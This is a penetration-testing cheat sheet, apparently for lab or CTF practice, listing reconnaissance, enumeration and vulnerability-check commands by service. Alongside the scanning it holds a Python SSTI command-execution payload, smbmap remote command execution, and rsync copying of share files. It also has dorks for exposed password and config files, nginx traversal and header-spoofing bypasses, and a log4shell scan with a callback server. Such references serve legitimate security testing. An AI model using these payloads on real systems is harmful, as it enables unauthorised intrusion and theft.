Passive :
    # dns enumeration
    host <HOST>
    dnsrecon -d <HOST>
    dnsenum <host>
    dig <host>
    fierce --domain <HOST>
    traceroue <HOST> # Linux
    tracert <HOST> # Windows
    
    # Subdomain enumeration
    sublist3r -d <HOST>
    theHarvester -d <Host>


    # WAF Detection
    wafw00f <HOST> -a

    # dorks syntax
    site:
    inurl:
    site:*.sitename.com
    intitle:
    filetype:
    intitle:index of
    cache:
    inurl:auth_user_file.txt
    inurl:passwd.txt
    inurl:wp-config.ba


Host descovery :
    # ping scan
    nmap -sn -n <NETWORK-RANGE>
    fping -I <INTERFACCE> -g <NETWORK-RANGE> -a

    # ARP scan
    netsdiscover -i <INTERFACCE> -r <NETWORK-RANGE>
    arp-scan -I <INTERFACCE> <NETWORK-RANGE>

    # Metaploit module
    auxiliary/scanner/discovery/arp_sweep
    auxiliary/scanner/discovery/ipv6_neighbor


Port scan :
    nmap -p- -n -v -Pn -T4 <HOST>

    # UDP
    nmap -sU -p- -n -v -Pn -T4 <HOST>

    # Metasploit module
    auxiliary/scanner/portscan/tcp
    auxiliary/scanner/portscan/syn
    auxiliary/scanner/portscan/udp_sweep

    # Service scan
    nmap -sV -sC -T4 -Pn -n --script=vuln,banner -p <PORTS> <IP>

Banner grabing
    nc -nv <IP> <PORT>

RPC
    rpcclient <IP>
    enum4linux <IP>
    IOXIDResolver <IP>

SMTP
    # metasploit module
    auxiliary/scanner/smtp/smtp_enum
    auxiliary/scanner/smtp/smtp_version

FTP
    ftp <IP>

    # Metasploit module
    use auxiliary/scanner/ftp/ftp_version
    use auxiliary/scanner/ftp/ftp_login
    use auxiliary/scanner/ftp/anonymous

SNMP
    # Metaploit module
    auxiliary/scanner/snmp/snmp_login

    snmpwalk -c <public|private> -v<1|2|3> <IP> 1.3.6.1
    onesixtyone <IP> <public|private>
    snmpcheck.rb <IP> -c <public|private>

RSYNC
    nmap -sV --script "rsync-list-modules"

    # List files in shares
    rsync -av --list-only rsync://<IP>/<SHARE>

    # Copy files from shares
    rsync -av rsync://<IP>/<SHARE> <LOCAL-FOLDER>

    # WITH CREDENTIALS 
    rsync -av --list-only rsync://USERNAME>@<IP>/<SHARE>
    rsync -av rsync://<USERNAME>@<IP>/<SHARE> <LOCAL-FOLDER>
    rsync -av <LOCAL-FOLDER> rsync://<USERNAME>@<IP>/<SHARE>



SMB
    # Enum smb
    crackmapexec smb <IP>
    
    # Enum shares
    crackmapexec smb <IP>
    crackmapexec smb <IP> --shares
    crackmapexec smb <IP> --shares -u '' -p ''
    crackmapexec smb <IP> --shares -u 'DoesNotExist' -p ''
    smbclient -L <IP> -N # Null session
    smbclient -L <IP> -U <USER>
    rpcclient -U '' -N <IP>
        - enumdomusers
        - enumdomgroups
        - lookupnames <USER>
    enum4linux -a -u <USER> -p <PASSWORD> <IP>
    
    # Connect to share
    smbclient //<IP>/<SHARE>

    # List drives 
    smbmap -u <USER> -p '<PASSWORD>' -H <HOST> -L

    # Run command
    smbmap -u <USER> -p '<PASSWORD>' -H <HOST> -x <CMD>
    
    # Metasploit modules
    auxiliary/scanner/smb/smb_version
    auxiliary/scanner/smb/smb_enumusers
    auxiliary/scanner/smb/smb_enumshares
    auxiliary/scanner/smb/smb_login
    auxiliary/scanner/smb/pipe_auditor
    auxiliary/scanner/smb/smb_ms17_010

    # CVE
    nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP> # Windows

HTTP
    # Manual check
    robots.txt
    admin[.php]
    login[.php]

    # Enum
    whatweb -a3 <HOST>
    nmap -p 80 --script=http-enum,http-headers -sV <IP>
    nmap -p 80 --script=http-method --script-args http-methods.url-path=/<PATH> <IP>
    nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/<WEBDAB-PATH>/ <IP> # Windows

    # directory busting
    gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -t40 -u http://10.10.113.26 <URL>
    gobuster dir -w /usr/share/wordlists/dirb/common.txt -U <USERNAME> -P <PASSWORD> -r -t40 -u <URL>
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -t40 -u  http://10.10.113.26 <URL> # linux
    gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -t40 -u <URL> # windows
    
    # VHOSTS
    gobuster vhost -w /usr/share/wordlists/dirb/common.txt -t40 -u <URL>
    gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t40 -u <URL> # linux
    gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t40 -u <URL> # windows

    # CVE
    nmap -sV --script ssl-enum-ciphers -p <SECURED_PORT> <TARGET>
    nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>
    nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_IP>

    # nginx bypass
    http://<IP>/image/..;/server-status
    http://<IP>/<KNOWN-DIRECTORY>/../server-status
    http://<IP>/.;/server-status
    http://<IP>/images../server-status
    
    # reverse proxy header bypass
    X-REAL-IP: 127.0.0.1
    X-Forwarded-For: 127.0.0.1

    # LFI Bruteforce
    ffuf -u '<URL>?<PARAM>=FUZZ' -w tools/file_inclustion_linux.txt 2>/dev/null

    # Default path 
    apache tomcat : /manager/html
    apache : /server-status

    # SSTI payload
    {{3+22}}
    ${{3+22}}
    ${3+22}
    {3+22}
    @{3+22}

    # SSTI env 
    []
    ''
    ()
    dict
    config
    request
    g

    # SSTI Python poc
    ''.__class__.mro()[1].__subclasses__()[396]('<COMMAND>',shell=True,stdout=-1).communicate()[0].strip()
    
    # wordpress enum
    wpscan --detection-mode aggressive -e u,vt,vp --url //http://10.10.178.91 <URL>



# Windows
    RDP 
        # metasploit module
        use auxiliary/scanner/rdp/rdp_scanner
        use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

    WinRM
        # Metasploit module
        auxiliary/scanner/winrm/winrm_auth_methods
    
    LDAP 
        ldapsearch -h <HOSTNAME> -d <ldap>@<USER NAME> -w <PASSWORD> -b 'dc=<FIRST-DOMAIN-PART>,dc=<SECOND-DOMAIN-PART>
# Linux 
    HTTP
        # shellshock
        nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>